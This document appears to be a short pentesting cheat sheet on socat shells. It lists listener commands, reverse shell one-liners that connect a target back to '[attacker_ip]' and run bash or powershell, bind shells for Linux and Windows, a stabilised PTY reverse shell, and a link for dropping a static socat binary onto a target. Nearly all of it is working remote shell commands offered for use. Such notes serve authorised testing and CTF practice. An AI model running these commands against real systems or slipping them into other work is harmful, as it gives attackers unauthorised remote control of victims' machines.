# SOCAT: Shells
## Unstable
#### Reverse Shell
Set up a basic listener:
```text
socat TCP-L:[port_number] -
```
For Windows machines to connect back use the following:
```text
socat TCP:[ip_address]:[port_number] EXEC:powershell.exe,pipes
```
For Linux machines to connect back use the following:
```text
socat TCP:[ip_address]:[port_number] EXEC:"bash -li"
```
#### Bind Shells
On a Linux machine set up the following listener:
```text
socat TCP-L:[port_number] EXEC:"bash -li"
```
On a Windows machine set up the following listener: 
```text
socat TCP-L:[port_number] EXEC:powershell.exe,pipes
```
Use the following to connect to that bind shell:
```text
socat TCP:[target_ip_address]:[target_port] -
```
## Stable
#### Reverse Shell
For a stable linux shell use the following to create a listener:
```text
socat TCP-L:[port_number] FILE:`tty`,raw,echo=0
```
If necessary install a precompiled socat binary on the target machine:
- https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
On the target machine execute the following command:
```text
socat TCP:[attacker_ip]:[attacker_port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
- pty, helps stabilisation
- stderr, displays error messages in the shell
- sigint, allows Ctrl + C commmands
- setsid, makes a process in a new session
- sane, stabilise the terminal
